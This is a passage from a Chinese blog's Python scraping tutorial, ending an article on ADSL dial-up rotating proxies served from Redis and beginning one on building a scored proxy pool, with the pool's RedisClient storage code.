</span>106.45.105.219:3328</span><br><span class="line"><span class="built_in">..</span>.</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们就可以看到，因为云主机在拨号之后当前代理就会失效了，所以在拨号之前程序先尝试从 Redis 中删除当前云主机的代理。接下来就开始执行拨号操作，拨号成功之后验证一下代理是可用的，然后再将该代理存储到 Redis 数据库中。循环往复运行，我们就达到了定时更换 IP 的效果，同时 Redis 数据库中也是实时可用的代理。</p>
                  <p>最后按照同样的配置，我们可以购买多台拨号云主机并进行如上同样的设置，这样就有多个稳定的定时更新的代理可用了，Redis 中会实时更新各台云主机的代理，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/yzu81.jpg" alt=""></p>
                  <p>图中所示是四台 ADSL 拨号云主机配置并运行后 Redis 数据库中的内容，其中的代理都是实时可用的。</p>
                  <h2 id="6-使用代理"><a href="#6-使用代理" class="headerlink" title="6. 使用代理"></a>6. 使用代理</h2>
                  <p>那怎么使用代理呢？我们可以在任意可以公网访问的云主机上连接刚才的 Redis 数据库并搭建一个 API 服务即可。怎么搭建呢？我们可以同样使用刚才的 adslproxy 库，该库也提供了 API 服务的功能。</p>
                  <p>为了方便测试，我们在本机进行测试，安装好 adslproxy 包之后，然后设置好 REDIS 相关的环境变量：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="builtin-name">export</span> <span class="attribute">REDIS_HOST</span>=&lt;Redis数据库的地址&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">REDIS_PORT</span>=&lt;Redis数据库的端口&gt;</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">REDIS_PASSWORD</span>=&lt;Redis数据库的密码&gt;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>然后运行如下命令启动即可：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="number">2020</span><span class="number">-07</span><span class="number">-11</span> <span class="number">16</span>:<span class="number">31</span>:<span class="number">58.651</span> | INFO     | adslproxy.server.server:serve:<span class="number">68</span> - API listening on http:<span class="comment">//0.0.0.0:8425</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到 API 服务就在 8425 端口上运行了，我们打开浏览器即可访问首页，如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/1j4aq.png" alt="image-20210711153319974"></p>
                  <p>其中最重要的就是 random 接口了，我们使用 random 接口即可获取 Redis 数据库中的一个随机代理，如图所示：</p>
                  <p><img src="https://cdn.cuiqingcai.com/9ogwc.png" alt="image-20210711153419543"></p>
                  <p>测试下可用性也没有问题，这样爬虫就可以使用这个代理来进行数据爬取了。</p>
                  <p>最后，我们将 API 服务部署一下，这个 ADSL 代理服务就可以像代理池一样被使用了，每请求一次 API 就可以获取一个实时可用代理，不同的时间段这个代理就会实时更换，而且连接稳定速度又快，实在是网络爬虫的最佳搭档。</p>
                  <h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h2>
                  <p>本节我们介绍了 ADSL 拨号代理的搭建过程。通过这种代理，我们可以无限次更换 IP，而且线路非常稳定，爬虫抓取效果也会好很多。</p>
                  <p>本节代码：<a href="https://github.com/Python3WebSpider/AdslProxy" target="_blank" rel="noopener">https://github.com/Python3WebSpider/AdslProxy</a>。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-03-05 09:33:45" itemprop="dateCreated datePublished" datetime="2022-03-05T09:33:45+08:00">2022-03-05</time>
                </span>
                <span id="/2022104.html" class="post-meta-item leancloud_visitors" data-flag-title="【2022 年】Python3 爬虫教程 - ADSL 拨号代理的使用" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>7.8k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>7 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/2022103.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/2022103.html" class="post-title-link" itemprop="url">【2022 年】Python3 爬虫教程 - 高效代理池的维护</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <blockquote>
                    <p>爬虫系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3 网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">《Python3 网络爬虫开发实战（第二版）》</a>一书了，<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">点击了解详情</a>。</p>
                  </blockquote>
                  <p>我们在上一节中了解了各个请求库设置代理的各个方法，但是如何实时高效地获取到大量可用的代理是一个问题。</p>
                  <p>首先，在互联网上有大量公开的免费代理。当然，我们也可以购买付费的代理 IP，但是代理不论是免费的还是付费的，都不能保证是可用的，因为此 IP 可能被其他人用来爬取同样的目标站点而被封禁，或者代理服务器突然发生故障或网络繁忙。一旦我们选用了一个不可用的代理，这势必会影响爬虫的工作效率。</p>
                  <p>所以，我们需要提前做筛选，将不可用的代理剔除掉，保留可用代理。</p>
                  <p>那么，怎么实现呢？这就需要借助于一个叫作代理池的东西了。</p>
                  <p>接下来，本节就来介绍一下如何搭建一个高效易用的代理池。</p>
                  <h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2>
                  <p>这里代理池的存储需要借助于 Redis，因此需要额外安装它。总体来说，本节需要的环境如下：</p>
                  <ul>
                    <li>
                      <p>需要安装并成功运行和连接一个 Redis 数据库，Redis 运行在本地或者远端服务器都可以，只要能正常连接就行，安装方式可以参考：<a href="https://setup.scrape.center/redis" target="_blank" rel="noopener">https://setup.scrape.center/redis</a></p>
                    </li>
                    <li>
                      <p>安装好一些必要的库，包括 aiohttp、requests、redis-py、pyquery、Flask、loguru 等，安装命令如下：</p>
                      <figure class="highlight cmake">
                        <table>
                          <tr>
                            <td class="gutter">
                              <pre><span class="line">1</span><br></pre>
                            </td>
                            <td class="code">
                              <pre><span class="line">pip3 <span class="keyword">install</span> aiohttp requests redis pyquery flask loguru</span><br></pre>
                            </td>
                          </tr>
                        </table>
                      </figure>
                    </li>
                  </ul>
                  <p>做好了如上准备工作，我们便可以开始实现或运行本节所讲的代理池了。</p>
                  <h2 id="2-代理池的目标"><a href="#2-代理池的目标" class="headerlink" title="2.代理池的目标"></a>2.代理池的目标</h2>
                  <p>我们需要做到下面几个目标来实现易用高效的代理池。</p>
                  <p>代理池基本模块分为 4 部分：存储模块、获取模块、检测模块和接口模块，其功能如下：</p>
                  <ul>
                    <li><strong>存储模块</strong>：负责存储抓取下来的代理。首先要保证代理不重复，要标识代理的可用情况，还要动态实时处理每个代理，所以一种比较高效和方便的存储方式就是使用 Redis 的 Sorted Set，即有序集合。</li>
                    <li><strong>获取模块</strong>：需要定时在各大代理网站抓取代理。代理既可以是免费公开代理，也可以是付费代理，代理的形式都是 IP 加端口。此模块尽量从不同来源获取，尽量抓取高匿代理，抓取成功之后将可用代理保存到数据库中。</li>
                    <li><strong>检测模块</strong>：需要定时检测数据库中的代理。这里需要设置一个检测链接，最好是爬取哪个网站就检测哪个网站，这样更加有针对性。如果要做一个通用型的代理，可以设置百度等链接来检测。另外，我们需要标识每一个代理的状态，如设置分数标识，100 分代表可用，分数越少代表越不可用。检测一次，如果代理可用，我们可以将分数标识立即设置为 100 满分，也可以在原基础上加 1 分；如果代理不可用，可以将分数标识减 1 分，当分数减到一定阈值后，代理就直接从数据库移除。通过这样标识分数，我们就可以辨别代理的可用情况，选用的时候会更有针对性。</li>
                    <li><strong>接口模块</strong>：需要用 API 来提供对外服务的接口。其实我们可以直接连接数据库来取对应的数据，但是这样就需要知道数据库的连接信息，并且要配置连接，而比较安全和方便的方式就是提供一个 Web API 接口，我们通过访问接口即可拿到可用代理。另外，由于可用代理可能有多个，所以我们可以设置一个随机返回某个可用代理的接口，这样就能保证每个可用代理都可以取到，实现负载均衡。</li>
                  </ul>
                  <p>以上内容是设计代理的一些基本思路。接下来，我们设计整体的架构，然后用代码实现代理池。</p>
                  <h2 id="3-代理池的架构"><a href="#3-代理池的架构" class="headerlink" title="3. 代理池的架构"></a>3. 代理池的架构</h2>
                  <p>根据上文的描述，代理池的架构如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/v0xz8.jpg" alt=""></p>
                  <p>图中所示的代理池分为 4 个模块：存储模块、获取模块、检测模块和接口模块：</p>
                  <ul>
                    <li>存储模块使用 Redis 的有序集合，用来做代理的去重和状态标识，同时它也是中心模块和基础模块，用于将其他模块串联起来。</li>
                    <li>获取模块定时从代理网站获取代理，将获取的代理传递给存储模块，并保存到数据库。</li>
                    <li>检测模块定时通过存储模块获取所有代理，并对代理进行检测，根据不同的检测结果对代理设置不同的标识。</li>
                    <li>接口模块通过 Web API 提供服务接口，接口通过连接数据库并通过 Web 形式返回可用的代理。</li>
                  </ul>
                  <h2 id="4-代理池的实现"><a href="#4-代理池的实现" class="headerlink" title="4.代理池的实现"></a>4.代理池的实现</h2>
                  <p>接下来，我们分别用代码来实现一下这 4 个模块。</p>
                  <blockquote>
                    <p>注意：完整的代理池代码量较大，因此本节的代码我们不再一步步跟着编写，最后去了解源码即可，源码地址为：<a href="https://github.com/Python3WebSpider/ProxyPool" target="_blank" rel="noopener">https://github.com/Python3WebSpider/ProxyPool</a></p>
                  </blockquote>
                  <h3 id="存储模块"><a href="#存储模块" class="headerlink" title="存储模块"></a>存储模块</h3>
                  <p>这里我们使用 Redis 的有序集合，集合中的每一个元素都是不重复的。对于代理池来说，集合中的元素就变成了一个个代理，也就是 IP 加端口的形式，如 <code>60.207.237.111:8888</code>。另外，有序集合的每一个元素都有一个分数字段，分数是可以重复的，既可以是浮点数类型，也可以是整数类型。该集合会根据每一个元素的分数对集合进行排序，数值小的排在前面，数值大的排在后面，这样就可以实现集合元素的排序了。</p>
                  <p>对于代理池来说，这个分数可以作为判断一个代理是否可用的标志：100 为最高分，代表最可用；0 为最低分，代表最不可用。如果要获取可用代理，可以从代理池中随机获取分数最高的代理。注意这里是随机，这样可以保证每个可用代理都会被调用到。</p>
                  <p>分数是我们判断代理稳定性的重要标准。设置分数的规则如下所示。</p>
                  <ul>
                    <li>分数 100 为可用，检测器会定时循环检测每个代理的可用情况。一旦检测到有可用的代理，就立即置为 100；如果检测到不可用，就将分数减 1，分数减至 0 后代理移除。</li>
                    <li>新获取的代理的分数为 10，如果测试可行，分数立即置为 100，不可行则将分数减 1，分数减至 0 后代理移除。</li>
                  </ul>
                  <p>这只是一种解决方案，当然可能还有更合理的方案。之所以设置此方案，有如下几个原因。</p>
                  <ul>
                    <li>在检测到代理可用时，分数立即置为 100，这样可以保证所有可用代理有更大的机会被获取到。你可能会问，为什么不将分数加 1 而是直接将其设为最高值 100 呢？设想一下，有的代理是从各大免费公开代理网站获取的，常常一个代理并没有那么稳定，平均 5 次请求可能有 2 次成功，3 次失败。如果按照这种方式来设置分数，那么这个代理几乎不可能达到一个高的分数，也就是说即便它有时是可用的，但是筛选的分数最高，那这样的代理几乎不可能被取到。如果想追求代理稳定性，可以用上述方法，这种方法可确保分数最高的代理一定是最稳定可用的。所以，这里我们采取 “可用即设置 100” 的方法，确保只要可用的代理都可以被获取到。</li>
                    <li>在检测到代理不可用时，分数减 1，分数减至 0 后，代理移除。这样一个有效代理如果被移除，需要连续不断失败 100 次。也就是说，当一个可用代理尝试了 100 次都失败了，就一直减分直到移除，一旦成功，就重新置回 100。尝试机会越多，这个代理拯救回来的机会越多，这样就不容易将曾经的一个可用代理丢弃，因为代理不可用的原因很可能是网络繁忙或者其他人用此代理请求太过频繁，所以这里将分数设为 100。</li>
                    <li>将新获取的代理的分数设置为 10，如果它不可用，分数就减 1，直到减到 0 就移除；如果代理可用，分数就置为 100。由于很多代理是从免费网站获取的，所以新获取的代理无效的比例非常高，可能可用的代理不足 10%。这里我们将分数设置为 10，检测的机会没有可用代理的 100 次那么多，这也可以适当减少开销。</li>
                  </ul>
                  <p>上述代理分数的设置思路不一定是最优思路，但据个人实测，它的实用性还是比较强的。</p>
                  <p>这里首先给出存储模块的实现代码，见 <a href="https://github.com/Python3WebSpider/ProxyPool/tree/master/proxypool/storages，建议直接对照源码阅读。" target="_blank" rel="noopener">https://github.com/Python3WebSpider/ProxyPool/tree/master/proxypool/storages，建议直接对照源码阅读。</a></p>
                  <p>在代码中，我们定义了一个类来操作数据库的有序集合，定义了一些方法来实现分数的设置、代理的获取等。其核心实现代码如下所示：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">from</span> proxypool.exceptions <span class="keyword">import</span> PoolEmptyException</span><br><span class="line"><span class="keyword">from</span> proxypool.schemas.proxy <span class="keyword">import</span> Proxy</span><br><span class="line"><span class="keyword">from</span> proxypool.setting <span class="keyword">import</span> REDIS_HOST, REDIS_PORT, REDIS_PASSWORD, REDIS_KEY, PROXY_SCORE_MAX, PROXY_SCORE_MIN, \</span><br><span class="line">    PROXY_SCORE_INIT</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> List</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">from</span> proxypool.utils.proxy <span class="keyword">import</span> is_valid_proxy, convert_proxy_or_proxies</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">REDIS_CLIENT_VERSION = redis.__version__</span><br><span class="line">IS_REDIS_VERSION_2 = REDIS_CLIENT_VERSION.startswith(<span class="string">'2.'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisClient</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    redis connection client of proxypool</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host=REDIS_HOST, port=REDIS_PORT, password=REDIS_PASSWORD, **kwargs)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        init redis client</span></span><br><span class="line"><span class="string">        :param host: redis host</span></span><br><span class="line"><span class="string">        :param port: redis port</span></span><br><span class="line"><span class="string">        :param password: redis password</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.db = redis.StrictRedis(host=host, port=port, password=password, decode_responses=<span class="literal">True</span>, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, proxy: Proxy, score=PROXY_SCORE_INIT)</span> -&gt; int:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        add proxy and set it to init score</span></span><br><span class="line"><span class="string">        :param proxy: proxy, ip:port, like 8.8.8.8:88</span></span><br><span class="line"><span class="string">        :param score: int score</span></span><br><span class="line"><span class="string">        :return: result</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_valid_proxy(<span class="string">f'<span class="subst">&#123;proxy.host&#125;</span>:<span class="subst">&#123;proxy.port&#125;</span>'</span>):</span><br><span class="line">            logger.info(<span class="string">f'invalid proxy <span class="subst">&#123;proxy&#125;</span>, throw it'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.exists(proxy):</span><br><span class="line">            <span class="keyword">if</span> IS_REDIS_VERSION_2:</span><br><span class="line">                <span class="keyword">return</span> self.db.zadd(REDIS_KEY, score, proxy.string())</span><br><span class="line">            <span class="keyword">return</span> self.db.zadd(REDIS_KEY, &#123;proxy.string(): score&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">random</span><span class="params">(self)</span> -&gt; Proxy:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        get random proxy</span></span><br><span class="line"><span class="string">        firstly try to get proxy with max score</span></span><br><span class="line"><span class="string">        if not exists, try to get proxy by rank</span></span><br><span class="line"><span class="string">        if not exists, raise error</span></span><br><span class="line"><span class="string">        :return: proxy, like 8.8.8.8:8</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># try to get proxy with max score</span></span><br><span class="line">        proxies = self.db.zrangebyscore(REDIS_KEY, PROXY_SCORE_MAX, PROXY_SCORE_MAX)</span><br><span class="line">        <span class="keyword">if</span> len(proxies):</span><br><span class="line">            <span class="keyword">return</span> convert_proxy_or_proxies(choice(proxies))</span><br><span class="line">        <span class="comment"># else get proxy by rank</span></span><br><span class="line">        proxies = self.db.zrevrange(REDIS_KEY, PROXY_SCORE_MIN, PROXY_SCORE_MAX)</span><br><span class="line">        <span class="keyword">if</span> len(proxies):</span><br><span class="line">            <span class="keyword">return</span> convert_proxy_or_proxies(choice(proxies))</span><br><span class="line">        <span class="comment"># else raise error</span></span><br><span class="line">        <span class="keyword">raise</span> PoolEmptyException</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrease</span><span class="params">(self, proxy: Proxy)</span> -&gt; int:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        decrease score of proxy, if small than PROXY_SCORE_MIN, delete it</span></span><br><span class="line"><span class="string">        :param proxy: proxy</span></span><br><span class="line"><span class="string">        :return: new score</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        score = self.db.zscore(REDIS_KEY, proxy.string())</span><br><span class="line">        <span class="comment"># current score is larger than PROXY_SCORE_MIN</span></span><br><span class="line">        <span class="keyword">if</span> score <span class="keyword">and</span> score &gt; PROXY_SCORE_MIN:</span><br><span class="line">            logger.info(<span class="string">f'<span class="subst">&#123;proxy.string()&#125;</span> current score <span class="subst">&#123;score&#125;</span>, decrease 1'</span>)</span><br><span class="line">            <span class="keyword">if</span> IS_REDIS_VERSION_2:</span><br><span class="line">                <span class="keyword">return</span> self.db.zincrby(REDIS_KEY, proxy.string(), <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">return</span> self.db.zincrby(REDIS_KEY, <span class="number">-1</span>, proxy.string())</span><br><span class="line">        <span class="comment"># otherwise delete proxy</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logger.info(<span class="string">f'<span class="subst">&#123;proxy.string()&#125;</span> current score <span class="subst">&#123;score&#125;</span>, remove'</span>)</span><br><span class="line">            <span class="keyword">return</span> self.db.zrem(REDIS_KEY, proxy.string())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exists</span><span class="params">(self, proxy: Proxy)</span> -&gt; bool:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        if proxy exists</span></span><br><span class="line"><span class="string">        :param proxy: proxy</span></span><br><span class="line"><span class="string">        :return: if exists, bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">not</span> self.db.zscore(REDIS_KEY, proxy.string()) <span class="keyword">is</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">max</span><span class="params">(self, proxy: Proxy)</span> -&gt; int:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        set proxy to max score</span></span><br><span class="line"><span class="string">        :param proxy: proxy</span></span><br><span class="line"><span class="string">        :return: new score</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        logger.info(<span class="string">f'<span class="subst">&#123;proxy.string()&#125;</span> is valid, set to <span class="subst">&#123;PROXY_SCORE_MAX&#125;</span>'</span>)</span><br><span class="line">        <span class="keyword">if</span> IS_REDIS_VERSION_2:</span><br><span class="line">            <span class="keyword">return</span> self.db.zadd(REDIS_KEY, PROXY_SCORE_MAX, proxy.string())</span><br><span class="line">        <span class="keyword">return</span> self.db.zadd(REDIS_KEY, &#123;proxy.string(): PROXY_SCORE_MAX&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">(self)</span> -&gt; int:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        get count of proxies</span></span><br><span class="line"><span class="string">        :return: count, int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> self.db.zcard(REDIS_KEY)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">all</span><span class="params">(self)</span> -&gt; List[Proxy]:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        get all proxies</span></span><br><span class="line"><span class="string">        :return: list of proxies</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> convert_proxy_or_proxies(self.db.zrangebyscore(REDIS_KEY, PROXY_SCORE_MIN, PROXY_SCORE_MAX))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">batch</span><span class="params">(self, start, end)</span> -&gt; List[Proxy]:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        get batch of proxies</span></span><br><span class="line"><span class="string">        :param start: start index</span></span><br><span class="line"><span class="string">        :param end: end index</span></span><br><span class="line"><span class="string">        :return: list of proxies</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> convert_proxy_or_proxies(self.db.zrevrange(REDIS_KEY, start, end - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    conn = RedisClient()</span><br><span class="line">    result = conn.random()</span><br><span class="line">    print(result)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>首先，我们定义了一些常量，如 <code>PROXY_SCORE_MAX</code>、<code>PROXY_SCORE_MIN</code>、<code>PROXY_SCORE_INIT</code> 分别代表最大分数、最小分数、初始分数。<code>REDIS_HOST</code>、<code>REDIS_PORT</code>、<code>REDIS_PASSWORD</code> 分别代表了 Redis 的连接信息，即地址、端口和密码。<code>REDIS_KEY</code> 是有序集合的键名，我们可以通过它来获取代理存储所使用的有序集合。</p>
                  <p><code>RedisClient</code> 这个类可以用来操作 Redis 的有序集合，其中定义了一些方法来对集合中的元素进行处理，它的主要功能如下所示。</p>
                  <ul>
                    <li><code>__init__</code> 方法是初始化的方法，其参数是 Redis 的连接信息，默认的连接信息已经定义为常量。我们在 <code>__init__</code> 方法中初始化了 <code>StrictRedis</code> 类，建立了 Redis 连接。</li>
                    <li><code>add</code> 方法用于向数据库添加代理并设置分数，默认的分数是 <code>PROXY_SCORE_INIT</code>，也就是 10，返回结果是添加的结果。</li>
                    <li><code>random</code> 方法是随机获取代理的方法。首先获取 100 分的代理，然后随机选择一个返回。如果不存在 100 分的代理，则此方法按照排名来获取，选取前 100 名，然后随机选择一个返回，否则抛出异常。</li>
                    <li><code>decrease</code> 方法是在代理检测无效的时候设置分数减 1 的方法，代理传入后，此方法将代理的分数减 1，如果分数达到最低值，那么代理就删除。</li>
                    <li><code>exists</code> 方法用于判断代理是否存在集合中。</li>
                    <li><code>max</code> 方法用于将代理的分数设置为 <code>PROXY_SCORE_MAX</code>，即 100，也就是代理有效时的设置。</li>
                    <li><code>count</code> 方法用于返回当前集合的元素个数。</li>
                    <li><code>all</code> 方法返回所有的代理列表，供检测使用。</li>
                  </ul>
                  <p>定义好这些方法后，我们可以在后续的模块中调用此类来连接和操作数据库。如果要获取随机可用的代理，只需要调用 <code>random</code> 方法即可，得到的就是随机的可用代理。</p>
                  <h3 id="获取模块"><a href="#获取模块" class="headerlink" title="获取模块"></a>获取模块</h3>
                  <p>获取模块主要是为了从各大网站抓取代理并调用存储模块进行保存，代码实现见 <a href="https://github.com/Python3WebSpider/ProxyPool/tree/master/proxypool/crawlers。" target="_blank" rel="noopener">https://github.com/Python3WebSpider/ProxyPool/tree/master/proxypool/crawlers。</a></p>
                  <p>获取模块的逻辑相对简单，比如我们可以定义一些抓取代理的方法，示例如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
